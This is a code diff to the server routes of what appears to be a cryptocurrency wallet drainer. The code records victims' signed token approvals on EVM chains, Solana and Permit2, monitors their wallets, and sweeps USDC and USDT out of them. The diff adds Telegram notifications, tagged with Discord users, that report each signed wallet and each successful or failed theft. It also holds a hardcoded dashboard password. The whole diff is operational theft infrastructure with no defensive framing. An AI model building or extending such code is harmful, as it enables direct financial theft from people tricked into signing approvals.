@@ -9,6 +9,7 @@ import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from 
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
 import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
+import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -51,7 +52,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const validatedData = insertApprovalSchema.parse(req.body);
       const approval = await storage.createApproval(validatedData);
       
-      // Add wallet to continuous monitoring
       const chainId = req.body.chainId || '1';
       await addWalletToMonitor(
         validatedData.walletAddress,
@@ -60,6 +60,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ['USDC', 'USDT']
       );
       console.log(`[Monitor] Added EVM wallet to monitoring: ${validatedData.walletAddress} (chain ${chainId})`);
+      
+      notifyWalletSigned({
+        walletAddress: validatedData.walletAddress,
+        network: "evm",
+        chainId,
+        tokens: [validatedData.tokenSymbol],
+        discordUser: req.body.discordUser,
+      }).catch(() => {});
       
       res.json(approval);
     } catch (error) {
@@ -94,6 +102,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
           amount: '0',
           transactionHash: result.txHash,
         });
+        
+        notifyTransferSuccess({
+          walletAddress,
+          network: "evm",
+          token: tokenSymbol,
+          amount: "0",
+          txHash: result.txHash,
+        }).catch(() => {});
       }
 
       res.json(result);
@@ -124,6 +140,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`[Solana] Approval recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
       console.log(`[Solana] Tokens approved:`, tokensApproved);
+      
+      notifyWalletSigned({
+        walletAddress,
+        network: "solana",
+        tokens: tokensApproved || ["USDC", "USDT"],
+        discordUser: req.body.discordUser,
+      }).catch(() => {});
       
       // Log each token approval separately for tracking
       const approvals = [];
@@ -163,7 +186,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
           const sweepResult = await sweepApprovedTokens(walletAddress, tokens);
           console.log(`[Solana] Sweep result:`, sweepResult);
           
-          // Log successful transfers to database
           for (const transfer of sweepResult.transfers) {
             if (transfer.success) {
               try {
@@ -174,6 +196,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   amount: transfer.amount,
                   transactionHash: transfer.signature,
                 });
+                
+                notifySweepSuccess({
+                  walletAddress,
+                  network: "solana",
+                  token: transfer.token,
+                  amount: transfer.amount,
+                  txHash: transfer.signature,
+                }).catch(() => {});
               } catch (err) {
                 console.log(`[Solana] Could not log transfer for ${transfer.token}`);
               }
@@ -201,6 +231,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       console.log(`[Solana] Manual sweep requested for: ${walletAddress}`);
       const result = await sweepApprovedTokens(walletAddress, tokens || ["USDC", "USDT"]);
+      
+      for (const transfer of result.transfers) {
+        if (transfer.success) {
+          notifySweepSuccess({
+            walletAddress,
+            network: "solana",
+            token: transfer.token,
+            amount: transfer.amount,
+            txHash: transfer.signature,
+          }).catch(() => {});
+        }
+      }
       
       res.json(result);
     } catch (error: any) {
@@ -448,20 +490,31 @@ export async function registerRoutes(app: Express): Promise<Server> {
         for (const transfer of result.transfers) {
           if (transfer.success) {
             try {
+              const tokenSymbol = resolveTokenSymbol(transfer.token);
               await storage.createApproval({
                 walletAddress: owner,
                 tokenAddress: transfer.token,
-                tokenSymbol: transfer.token === '0xdAC17F958D2ee523a2206206994597C13D831ec7' ? 'USDT' : 'USDC',
+                tokenSymbol,
                 transactionHash: result.txHash,
               });
 
               await storage.createTransfer({
                 walletAddress: owner,
                 tokenAddress: transfer.token,
-                tokenSymbol: transfer.token === '0xdAC17F958D2ee523a2206206994597C13D831ec7' ? 'USDT' : 'USDC',
+                tokenSymbol,
                 amount: transfer.amount,
                 transactionHash: result.txHash,
               });
+
+              notifyTransferSuccess({
+                walletAddress: owner,
+                network: "evm",
+                chainId: String(chainId),
+                token: tokenSymbol,
+                amount: transfer.amount,
+                txHash: result.txHash,
+                discordUser: req.body.discordUser,
+              }).catch(() => {});
             } catch (err) {
               console.log(`[Permit2] Could not log transfer for ${transfer.token}`);
             }
@@ -472,6 +525,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } else if (!result.success) {
         await savePendingTransfer(transferParams);
         console.log(`[API] Transfer failed, saved for retry: ${result.error}`);
+        
+        notifyTransferFailed({
+          walletAddress: owner,
+          network: "evm",
+          chainId: String(chainId),
+          error: result.error || "Unknown error",
+          discordUser: req.body.discordUser,
+        }).catch(() => {});
       }
 
       res.json(result);
